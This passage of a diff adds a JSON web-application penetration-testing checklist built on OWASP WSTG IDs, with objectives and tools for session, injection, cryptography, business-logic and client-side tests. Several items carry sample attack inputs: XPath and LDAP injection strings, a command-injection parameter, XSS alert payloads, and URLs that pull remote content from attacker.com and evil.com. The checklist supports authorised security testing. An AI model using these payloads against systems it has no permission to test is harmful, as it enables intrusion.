+              "content": "<p><strong>WSTG-ID:</strong> WSTG-SESS-06 <br><br> </p>\n                <p><strong>Objectives:</strong> - Assess the logout UI.<br>- Analyze the session timeout and if the session is properly killed after logout. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "7409875f-7817-4da9-8fe1-c6bce3f129af",
+              "title": "Testing Session Timeout",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-SESS-07 <br><br> </p>\n                <p><strong>Objectives:</strong> - Validate that a hard session timeout exists, after the timeout has passed, all session tokens should be destroyed or be unusable. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "ecacc945-4889-4722-8b9f-b7a04fb5430f",
+              "title": "Testing for Session Puzzling",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-SESS-08 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify all session variables.<br>- Break the logical flow of session generation.<br>- Check whether the application uses the same session variable for more than one purpose <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "69a974ec-373d-42c5-adb4-ee52eeeed2bd",
+              "title": "Testing for Session Hijacking",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-SESS-09 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify vulnerable session cookies.<br>- Hijack vulnerable cookies and assess the risk level. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A2<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "46820423-9c25-4896-9529-d97bf4ae3cc4",
+              "title": "Testing JSON Web Tokens",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-SESS-10 <br><br> </p>\n                <p><strong>Objectives:</strong> - Determine whether the JWTs expose sensitive information.<br>- Determine whether the JWTs can be tampered with or modified. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        },
+        {
+          "id": "3f53aa48-2cd8-4729-999b-98063d2549af",
+          "title": "7. Data Validation Testing",
+          "checklist": [
+            {
+              "id": "5ba94710-f38f-4640-8fb4-65b83dab0bd0",
+              "title": "Testing for Reflected Cross Site Scripting",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-01 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify variables that are reflected in responses.<br>- Assess the input they accept and the encoding that gets applied on return (if any). <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "dde583c0-690f-48d5-8079-50bbc8963e63",
+              "title": "Testing for Stored Cross Site Scripting",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-02 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify stored input that is reflected on the client-side.<br>- Assess the input they accept and the encoding that gets applied on return (if any). <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "2fba1fd2-9550-41e2-87ad-f335fe11be7b",
+              "title": "Testing for HTTP Verb Tampering",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-03 <br><br> </p>\n                <p><strong>Objectives:</strong> N/A, This content has been merged into: WSTG-CONF-06 <br> <br></p>\n                <p><strong>Tools:</strong> NA <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> NA<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "a1bda475-d6bf-4bf4-bd6a-a38f92432a3f",
+              "title": "Testing for HTTP Parameter Pollution",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-04 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify the backend and the parsing method used.<br>- Assess injection points and try bypassing input filters using HPP. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "e5c026c1-035d-4a05-9c54-325a950f80d1",
+              "title": "Testing for SQL Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-05 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify SQL injection points.<br>- Assess the severity of the injection and the level of access that can be achieved through it. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP SQLMap<br>NoSQLMap <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "32dc4be2-f568-4ee8-8cb4-fdcb175a13fa",
+              "title": "Testing for LDAP Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-06 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify LDAP injection points:<br>/ldapsearch?user=*<br>user=*user=*)(uid=*))(|(uid=*<br>pass=password<br>- Assess the severity of the injection: <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "8954952c-5e42-4ec4-8410-4dfe357bda7a",
+              "title": "Testing for XML Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-07 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify XML injection points with XML Meta Characters:<br>', \" , <>, <!--/-->, &, <![CDATA[ / ]]>, XXE, TAG<br>- Assess the types of exploits that can be attained and their severities. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP<br>Wfuzz <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "019e8ce8-6cb0-420d-940f-155b3782b445",
+              "title": "Testing for SSI Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-08 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify SSI injection points (Presense of .shtml extension) with these characters:<br>< ! # = / . \" - > and [a-zA-Z0-9]<br>- Assess the severity of the injection. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "3faa50ac-37bc-425f-a46e-8fb45464f0f6",
+              "title": "Testing for XPath Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-09 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify XPATH injection points by checking for XML error enumeration by supplying a single quote ('):<br>Username: ‘ or ‘1’ = ‘1<br>Password: ‘ or ‘1’ = ‘1 <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "aceaa768-0b44-4576-bb69-6bb00a15e9e0",
+              "title": "Testing for IMAP SMTP Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-10 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify IMAP/SMTP injection points (Header, Body, Footer) with special characters (i.e.: \\, ‘, “, @, #, !, |)<br>- Understand the data flow and deployment structure of the system.<br>- Assess the injection impacts. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "03a7bc61-d217-4d59-88f8-8ece044a3f48",
+              "title": "Testing for Code Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-11 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify injection points where you can inject code into the application. <br>- Check LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource).<br>- Check RFI from malicious URL <br>?page.php?file=http://attacker.com/malicious_page<br>- Assess the injection severity. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP<br>Liffy<br>LFImap <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "6ce0b560-f12c-478c-b4fc-263232299f30",
+              "title": "Testing for Command Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-12 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify and assess the command injection points with special characters (i.e.: | ; & $ > < ' !)<br>For example: ?doc=Doc1.pdf+|+Dir c:\\ <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP Commix <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "d1896ecc-ebc0-41f9-9259-d8038107e37b",
+              "title": "Testing for Format String Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-13 <br><br> </p>\n                <p><strong>Objectives:</strong> - Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application. <br> <br></p>\n                <p><strong>Tools:</strong> Immunity Canvas<br>Spike<br>MSF <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "4ab196d4-25c3-4681-9995-7aed5ce634b3",
+              "title": "Testing for Incubated Vulnerability",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-14 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify injections that are stored and require a recall step to the stored injection. (i.e.: CSV Injection, Blind Stored XSS, File Upload)<br>- Understand how a recall step could occur.<br>- Set listeners or activate the recall step if possible. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP<br>BeEF <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "9a30d4fe-e31f-461d-ae9c-ee97417c5689",
+              "title": "Testing for HTTP Splitting Smuggling",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-15 <br><br> </p>\n                <p><strong>Objectives:</strong> - Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.<br>- Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br>A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "30a416f6-08d5-4369-9667-01ef153b733d",
+              "title": "Testing for HTTP Incoming Requests",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-16 <br><br> </p>\n                <p><strong>Objectives:</strong> - Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests.<br>- Monitor HTTP traffic without changes of end user Browser proxy or client-side application. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> NA<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "5ad99a4c-1b3e-49b9-b44c-fef7a40f20a3",
+              "title": "Testing for Host Header Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-17 <br><br> </p>\n                <p><strong>Objectives:</strong> - Assess if the Host header is being parsed dynamically in the application.<br>- Bypass security controls that rely on the header. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP<br>Netcat <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "eb3b9638-821d-49b3-abfb-ad855d76cd53",
+              "title": "Testing for Server-side Template Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-18 <br><br> </p>\n                <p><strong>Objectives:</strong> - Detect template injection vulnerability points.<br>- Identify the templating engine.<br>- Build the exploit. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP<br>Tplmap <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "42a78b64-09a7-408c-9588-1eed546e4620",
+              "title": "Testing for Server-Side Request Forgery",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-19 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify SSRF injection points.<br>- Test if the injection points are exploitable.<br>- Asses the severity of the vulnerability. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A10<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "f6c5733f-c1be-43e2-bcd3-c4ad46897c58",
+              "title": "Testing for Mass Assignment",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-INPV-20 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify requests that modify objects<br>- Assess if it is possible to modify fields never intended to be modified from outside <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        },
+        {
+          "id": "fdb05822-245f-4efe-83e9-c88797e97381",
+          "title": "8. Error Handling",
+          "checklist": [
+            {
+              "id": "c891ce70-27c9-4cd8-8589-98ee90d199f2",
+              "title": "Testing for Improper Error Handling",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ERRH-01 <br><br> </p>\n                <p><strong>Objectives:</strong>  <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "fd5d7006-e56f-4249-8fb9-255bc450e4bc",
+              "title": "Testing for Stack Traces",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-ERRH-02 <br><br> </p>\n                <p><strong>Objectives:</strong>  <br> <br></p>\n                <p><strong>Tools:</strong> NA <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> NA<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        },
+        {
+          "id": "7d709d8b-ce68-42fb-b61f-227f34599693",
+          "title": "9. Cryptography",
+          "checklist": [
+            {
+              "id": "463e02ef-21b9-42b2-97c3-517973f0f0eb",
+              "title": "Testing for Weak Transport Layer Security",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CRYP-01 <br><br> </p>\n                <p><strong>Objectives:</strong> - Validate the server configuration (Identify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)<br>- Review the digital certificate's cryptographic strength and validity.<br>- Ensure that the TLS security is not bypassable and is properly implemented across the application. <br> <br></p>\n                <p><strong>Tools:</strong> testssl.sh <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A2<br>A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "b73088d7-99b3-4e5c-92c2-004fa465421b",
+              "title": "Testing for Padding Oracle",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CRYP-02 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify encrypted messages that rely on padding.<br>- Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis. <br> <br></p>\n                <p><strong>Tools:</strong> PadBuster<br>POET <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A2<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "e5252ae8-3e04-4749-a25a-14c47ff830e2",
+              "title": "Testing for Sensitive Information Sent via Unencrypted Channels",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CRYP-03 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify sensitive information transmitted through the various channels.<br>- Assess the privacy and security of the channels used.<br>- Check sensitive data during the transmission:<br>• Information used in authentication (e.g. Credentials, PINs, Session<br>identifiers, Tokens, Cookies…)<br>• Information protected by laws, regulations or specific organizational<br>policy (e.g. Credit Cards, Customers data) <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A2<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "1422fff6-73ea-4dca-a7fa-1550a4645541",
+              "title": "Testing for Weak Encryption",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CRYP-04 <br><br> </p>\n                <p><strong>Objectives:</strong> - Provide a guideline for the identification weak encryption or hashing uses and implementations. <br> <br></p>\n                <p><strong>Tools:</strong> Testssl.sh<br>Nessus <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A2<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        },
+        {
+          "id": "3817c391-e91f-48cd-8992-3ae40d251a4b",
+          "title": "10. Business logic Testing",
+          "checklist": [
+            {
+              "id": "af6ca1dd-540a-44cc-8fa1-c72e3cc82949",
+              "title": "Test Business Logic Data Validation",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-BUSL-01 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify data injection points.<br>- Validate that all checks are occurring on the back end and can't be bypassed.<br>- Attempt to break the format of the expected data and analyze how the application is handling it. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "f73a2902-bc74-4053-9374-9d6226489634",
+              "title": "Test Ability to Forge Requests",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-BUSL-02 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review the project documentation looking for guessable, predictable, or hidden functionality of fields.<br>- Insert logically valid data in order to bypass normal business logic workflow. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "763ba6b1-c404-4f6c-a5dc-a1195b6f7e11",
+              "title": "Test Integrity Checks",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-BUSL-03 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review the project documentation for components of the system that move, store, or handle data.<br>- Determine what type of data is logically acceptable by the component and what types the system should guard against.<br>- Determine who should be allowed to modify or read that data in each component.<br>- Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow. <br> <br></p>\n                <p><strong>Tools:</strong> Burp Proxy <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "b237b450-32f0-459d-8988-421925307625",
+              "title": "Test for Process Timing",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-BUSL-04 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review the project documentation for system functionality that may be impacted by time. Such as execution time or actions that<br>help users predict a future outcome or allow one to circumvent<br>any part of the business logic or workflow. For example, not<br>completing transactions in an expected time.<br>- Develop and execute the mis-use cases ensuring that attackers<br>can not gain an advantage based on any timing (Race Condition). <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "eb3dab99-2c1a-4603-a2b7-4bbcf0513dd1",
+              "title": "Test Number of Times a Function Can Be Used Limits",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-BUSL-05 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify functions that must set limits to the times they can be called.<br>- Assess if there is a logical limit set on the functions and if it is properly validated.<br>- For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br>A7<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "2b0a9d26-47be-4060-9dd9-39c6fe7b9c22",
+              "title": "Testing for the Circumvention of Work Flows",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-BUSL-06 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic flow.<br>- Develop a misuse case and try to circumvent every logic flow identified. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "696d2175-46df-4804-a491-0f32e370d7b4",
+              "title": "Test Defenses Against Application Misuse",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-BUSL-07 <br><br> </p>\n                <p><strong>Objectives:</strong> - Generate notes from all tests conducted against the system.<br>- Review which tests had a different functionality based on aggressive input.<br>- Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.<br>- Measures that might indicate the application has in-built self-defense:<br>• Changed responses<br>• Blocked requests<br>• Actions that log a user out or lock their account <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "528e8d6a-1871-4483-a94a-1561832de631",
+              "title": "Test Upload of Unexpected File Types",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-BUSL-08 <br><br> </p>\n                <p><strong>Objectives:</strong> - Review the project documentation for file types that are rejected by the system.<br>- Verify that the unwelcomed file types are rejected and handled safely. Also, check whether the website only check for \"Content-type\" or file extension.<br>- Verify that file batch uploads are secure and do not allow any bypass against the set security measures. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "debccc0e-18d9-4a6b-bfd3-5a733194617d",
+              "title": "Test Upload of Malicious Files",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-BUSL-09 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify the file upload functionality.<br>- Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.<br>- If documentation is not available then consider what would be appropriate based on the purpose of the application.<br>- Determine how the uploaded files are processed.<br>- Obtain or create a set of malicious files for testing.<br>- Try to upload the malicious files to the application and determine whether it is accepted and processed. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "226d63c1-5cba-4618-98f8-2e236d9db759",
+              "title": "Test Payment Functionality",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-BUSL-10 <br><br> </p>\n                <p><strong>Objectives:</strong> - Determine whether the business logic for the e-commerce functionality is robust.<br>- Understand how the payment functionality works.<br>- Determine whether the payment functionality is secure. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        },
+        {
+          "id": "42fc7d2a-c4cb-48ec-9920-473da599b07c",
+          "title": "11. Client Side Testing",
+          "checklist": [
+            {
+              "id": "496c451b-8012-45da-ae61-44013ea659ed",
+              "title": "Testing for DOM-Based Cross Site Scripting",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-01 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify DOM sinks.<br>- Build payloads that pertain to every sink type. <br>For example: #<script>alert('xss')</script> <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "416e2568-f16f-45a8-97bd-c336e26df4d4",
+              "title": "Testing for JavaScript Execution",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-02 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify sinks and possible JavaScript injection points.<br>For example: ?javascript:alert(1) <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "f990c176-d3df-4ab8-9bdb-83ac48c90d00",
+              "title": "Testing for HTML Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-03 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify HTML injection points and assess the severity of the injected content.<br>For example: page.html?user=<img%20src='aaa'%20onerror=alert(1)> <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "6f0ee5d8-2d09-431a-aa04-ebb4c50d8abf",
+              "title": "Testing for Client-side URL Redirect",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-04 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify injection points that handle URLs or paths.<br>- Assess the locations that the system could redirect to (Open Redirect).<br>For example: ?redirect=www.fake-target.site <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "11dcfd36-5adc-45c4-8fc6-db4afea40479",
+              "title": "Testing for CSS Injection",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-05 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify CSS injection points.<br>- Assess the impact of the injection. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "66e2a8e0-cd2c-4a41-b492-d9c883122fbb",
+              "title": "Testing for Client-side Resource Manipulation",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-06 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify sinks with weak input validation.<br>- Assess the impact of the resource manipulation.<br>For example: www.victim.com/#http://evil.com/js.js <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "10a5bd6f-8184-4097-bcd9-3b147844ea47",
+              "title": "Testing Cross Origin Resource Sharing",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-07 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify endpoints that implement CORS.<br>- Ensure that the CORS configuration is secure or harmless. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "d7c00bf9-4822-43a3-a6ef-f5bba499890f",
+              "title": "Testing for Cross Site Flashing",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-08 <br><br> </p>\n                <p><strong>Objectives:</strong> - Decompile and analyze the application's code.<br>- Assess sinks inputs and unsafe method usages.<br>For example: file.swf?lang=http://evil <br> <br></p>\n                <p><strong>Tools:</strong> Flare<br>Flasm<br>SWF Intruder <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "6ef73861-25c1-43a5-ac10-ebb5fc144543",
+              "title": "Testing for Clickjacking",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-09 <br><br> </p>\n                <p><strong>Objectives:</strong> - Understand security measures in place.<br>- Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.<br>- Assess how strict the security measures are and if they are bypassable. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "1f2ba0df-292f-4d3e-b775-8aa54229e7ba",
+              "title": "Testing WebSockets",
